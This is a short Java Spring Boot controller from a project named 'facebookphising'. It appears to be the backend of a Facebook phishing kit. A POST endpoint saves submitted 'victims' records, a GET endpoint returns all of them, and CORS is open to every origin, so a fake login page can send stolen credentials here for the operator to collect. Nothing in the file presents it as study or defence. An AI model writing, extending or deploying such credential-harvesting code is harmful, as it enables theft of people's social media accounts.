package com.phising.facebookphising.controller;

import com.phising.facebookphising.model.VictimsModel;
import com.phising.facebookphising.service.VictimsService;
import lombok.AllArgsConstructor;
import org.springframework.web.bind.annotation.*;

import java.util.List;

@RestController
@CrossOrigin("*")
@AllArgsConstructor
public class VictimsController {
    private final VictimsService victimsService;

    @PostMapping("/add")
    public void saveVictims(@RequestBody VictimsModel victimsModel){
        victimsService.save(victimsModel);
    }

    @GetMapping
    public List<VictimsModel> getVictims(){
        return victimsService.getAllVictims();
    }
}
